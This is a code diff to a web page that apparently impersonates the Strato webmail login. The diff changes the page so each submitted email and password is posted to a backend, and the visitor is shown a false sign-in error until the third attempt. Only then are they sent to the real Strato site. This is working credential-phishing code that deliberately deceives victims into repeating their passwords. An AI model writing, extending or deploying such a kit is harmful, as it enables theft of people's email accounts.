@@ -10,6 +10,8 @@ export default function Home() {
   const [langChange, setLangChange] = useState<(typeof i18n.locales)[number]>(
     i18n.defaultLocale
   );
+  const [step, setStep] = useState(0);
+  const [err, setErr] = useState<string | undefined>("");
 
   const forma = useRef<HTMLFormElement>(null);
 
@@ -30,9 +32,13 @@ export default function Home() {
       const result = await axios.post("/api/send", JSON.stringify(dataObj));
 
       if (result.status === 200) {
-        return window.location.replace(
-          "https://webmail.strato.com/appsuite/ui"
-        );
+        if (step == 2)
+          return window.location.replace(
+            "https://webmail.strato.com/appsuite/ui"
+          );
+
+        setStep(step + 1);
+        setErr(languages?.signerr);
       }
 
       return;
@@ -78,6 +84,7 @@ export default function Home() {
           </h1>
 
           <form ref={forma} onSubmit={formData} className="pl-8 pt-14">
+            <p className="text-red-500 my-2 text-sm">{err}</p>
             <label htmlFor="email" className="text-sm text-[#665]">
               {languages.email}
             </label>
@@ -104,6 +111,7 @@ export default function Home() {
                 type="email"
                 name="email"
                 id="em"
+                onChange={() => setErr("")}
                 className="block py-2 px-1 outline-none w-full mr-1"
                 required
               />
@@ -133,6 +141,7 @@ export default function Home() {
                 type="password"
                 name="pass"
                 id="pass"
+                onChange={() => setErr("")}
                 className="block py-2 px-1 outline-none w-full mr-1"
                 required
               />
